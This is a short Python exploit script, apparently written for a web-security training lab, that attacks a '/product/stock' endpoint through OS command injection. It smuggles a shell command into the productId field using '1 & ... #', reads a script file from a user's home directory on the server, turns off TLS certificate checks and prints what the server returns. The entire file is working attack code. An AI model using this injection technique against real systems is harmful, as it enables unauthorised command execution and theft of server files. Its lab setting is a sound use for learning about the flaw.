import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def simple_exploit(url,command):
    path = "/product/stock"
    params = {'productId':'1 & ' + command + ' #','storeId':'12'}
    res = requests.post(url + path,data = params,verify = False)

    print(res.text)

def main():
    if len(sys.argv) != 2:
        print("[+]usage:%s <url>"%sys.argv[0])
    
    url = sys.argv[1]
    command = "cat /home/peter-prTFXv/stockreport.sh"
    print("exploiting...")
    simple_exploit(url,command)

if __name__ == "__main__":
    main()